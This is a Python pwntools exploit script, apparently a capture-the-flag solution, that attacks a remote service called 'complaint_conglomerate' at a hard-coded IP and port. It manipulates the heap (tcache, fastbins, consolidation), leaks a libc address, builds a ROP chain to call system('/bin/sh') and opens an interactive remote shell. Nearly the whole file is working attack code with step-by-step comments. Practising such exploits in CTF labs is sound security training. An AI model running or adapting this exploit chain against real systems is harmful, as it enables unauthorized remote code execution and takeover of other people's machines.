from pwn import *

# Target configuration
REMOTE_HOST = '83.136.252.13'
REMOTE_PORT = 49116

# Set pwntools context for cleaner output
context.binary = 'complaint_conglomerate'
context.log_level = 'error'
context.terminal = ['gnome-terminal', '-x', 'sh', '-c']


def connect_to_target():
    """
    Establishes a connection to the target. For local testing,
    uncomment the process() line and comment out remote().
    """
    # return process(context.binary)  # uncomment for local testing
    return remote(REMOTE_HOST, REMOTE_PORT)


def exploit():
    """
    Executes the full exploit chain to spawn a shell on the remote.
    """
    conn = connect_to_target()

    # Step 1: Saturate the heap to force malloc_consolidate when top chunk is freed
    total_chunks = 1390
    for i in range(total_chunks):
        conn.sendlineafter(b'> ', b'1')     # choose allocate
        conn.sendlineafter(b': ', b'1')     # small index
        conn.sendlineafter(b': ', b'1')     # small size
        conn.sendlineafter(b': ', b'A' * 0x50)
        print(f'\rSaturation: {i+1}/{total_chunks}', end='')
    print()

    # Step 2: Allocate extra chunks to fill tcache (7) and fastbins (3)
    extra_chunks = 10
    for idx in range(extra_chunks):
        conn.sendlineafter(b'> ', b'1')
        conn.sendlineafter(b': ', str(idx).encode())
        conn.sendlineafter(b': ', b'1')
        conn.sendlineafter(b': ', b'A' * 0x50)

    # Free those extra chunks to populate tcache and fastbins
    for idx in range(extra_chunks):
        conn.sendlineafter(b'> ', b'2')
        conn.sendlineafter(b': ', str(idx).encode())

    # Step 3: Trigger consolidation by allocating and freeing small chunks
    for _ in range(2):
        conn.sendlineafter(b'> ', b'1')
        conn.sendlineafter(b': ', b'1')
        conn.sendlineafter(b': ', b'0')     # size that hits top chunk
        conn.sendlineafter(b': ', b'B' * 0x30)

    # Step 4: Leak libc address from unsorted bin
    conn.sendlineafter(b'> ', b'3')         # choose show
    conn.sendlineafter(b': ', b'8')         # show index 8
    leak_bytes = conn.recvline().strip()
    libc_leak = int.from_bytes(leak_bytes, 'little')

    # Calculate libc base and required gadgets
    libc_base = libc_leak - 0x1d2cc0
    system_addr = libc_base + 0x4c490
    bin_sh_addr = libc_base + 0x196031
    pop_rdi = libc_base + 0x1034d0
    ret_gadget = libc_base + 0xf60cd

    log.info(f"Libc base: {hex(libc_base)}")

    # Step 5: Build ROP chain in a new heap chunk
    rop_payload = flat(
        b'A' * 0x28,    # padding to saved RIP
        pop_rdi,
        bin_sh_addr,
        ret_gadget,     # stack alignment
        system_addr
    )
    conn.sendlineafter(b'> ', b'1')         # allocate
    conn.sendlineafter(b': ', b'1')
    conn.sendlineafter(b': ', b'1')
    conn.sendlineafter(b': ', rop_payload)

    # Final: Trigger the vulnerable AI function to hijack RIP
    conn.sendlineafter(b'> ', b'4')         # AI function
    conn.sendlineafter(b'> ', b'y')         # confirm
    conn.sendlineafter(b': ', b'1')         # choose our chunk

    conn.interactive()


if __name__ == '__main__':
    exploit()
